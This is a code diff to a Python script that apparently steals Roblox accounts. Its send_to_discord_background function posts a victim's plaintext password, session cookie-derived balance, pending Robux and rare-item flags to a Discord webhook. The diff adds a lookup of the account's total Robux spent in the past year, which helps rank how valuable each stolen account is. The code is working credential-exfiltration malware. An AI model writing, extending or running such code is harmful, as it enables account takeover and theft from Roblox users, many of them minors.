@@ -83,28 +83,33 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
                             'inline': False
                         },
                         {
-                            'name': '💰 Robux',
-                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
-                            'inline': False
-                        },
-                        {
-                            'name': '⌛ Pending Robux',
-                            'value': user_info['pending_robux'],
-                            'inline': False
-                        },
-                        {
-                            'name': '📊 Status',
-                            'value': 'Success 🟩',
-                            'inline': False
-                        },
-                        {
                             'name': '🔐 Password',
                             'value': password if password else 'Not provided',
                             'inline': False
                         },
                         {
-                            'name': '🎭 Items',
-                            'value': f"Korblox: {'✅' if korblox else '❌'} | Headless: {'✅' if headless else '❌'}",
+                            'name': '💰 Robux',
+                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
+                            'inline': False
+                        },
+                        {
+                            'name': '⌛ Pending',
+                            'value': user_info['pending_robux'],
+                            'inline': False
+                        },
+                        {
+                            'name': '📊 Total spent robux past Year',
+                            'value': user_info.get('total_spent_past_year', 'Not available'),
+                            'inline': False
+                        },
+                        {
+                            'name': '👑 Korblox',
+                            'value': '✅' if korblox else '❌',
+                            'inline': False
+                        },
+                        {
+                            'name': '💀 Headless',
+                            'value': '✅' if headless else '❌',
                             'inline': False
                         }
                     ],
@@ -227,6 +232,41 @@ def get_roblox_user_info(cookie):
                 print(f"Error getting Pending Robux: {str(pending_error)}")
                 pending_robux = '0'
             
+            # Get Total spent robux past year using transaction totals endpoint
+            total_spent_past_year = 'Not available'
+            try:
+                # Try yearly timeframe first
+                year_response = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary',
+                                           headers=headers, timeout=5)
+                print(f"Yearly spending API response status: {year_response.status_code}")
+                
+                if year_response.status_code == 200:
+                    year_data = year_response.json()
+                    print(f"Yearly spending API response: {year_data}")
+                    
+                    # Look for outgoing robux total (spent robux)
+                    if 'outgoingRobuxTotal' in year_data:
+                        spent_amount = year_data['outgoingRobuxTotal']
+                        total_spent_past_year = f"{spent_amount:,}" if isinstance(spent_amount, (int, float)) else str(spent_amount)
+                    elif 'robuxSpent' in year_data:
+                        spent_amount = year_data['robuxSpent']
+                        total_spent_past_year = f"{spent_amount:,}" if isinstance(spent_amount, (int, float)) else str(spent_amount)
+                    else:
+                        print("No spending data fields found in yearly response")
+                        total_spent_past_year = '0'
+                        
+                elif year_response.status_code == 500:
+                    # Known issue with yearly timeframe, try monthly as fallback
+                    print("Yearly API returned 500 error, falling back to monthly data estimation")
+                    total_spent_past_year = 'Estimate unavailable'
+                else:
+                    print(f"Yearly spending API failed with status: {year_response.status_code}, response: {year_response.text}")
+                    total_spent_past_year = 'API Error'
+                    
+            except Exception as year_error:
+                print(f"Error getting yearly spending data: {str(year_error)}")
+                total_spent_past_year = 'Connection Error'
+            
             # Check Premium status
             premium_status = '❌ No'
             try:
@@ -255,7 +295,8 @@ def get_roblox_user_info(cookie):
                 'profile_picture': profile_picture_url,
                 'robux_balance': robux_balance,
                 'pending_robux': pending_robux,
-                'premium_status': premium_status
+                'premium_status': premium_status,
+                'total_spent_past_year': total_spent_past_year
             }
         else:
             print(f"Cookie validation failed against Roblox API: {response.status_code}")
@@ -273,7 +314,8 @@ def get_roblox_user_info(cookie):
         'profile_picture': 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter',
         'robux_balance': 'Not available',
         'pending_robux': 'Not available',
-        'premium_status': '❌ No'
+        'premium_status': '❌ No',
+        'total_spent_past_year': 'Not available'
     }
 
 def is_valid_cookie(cookie):
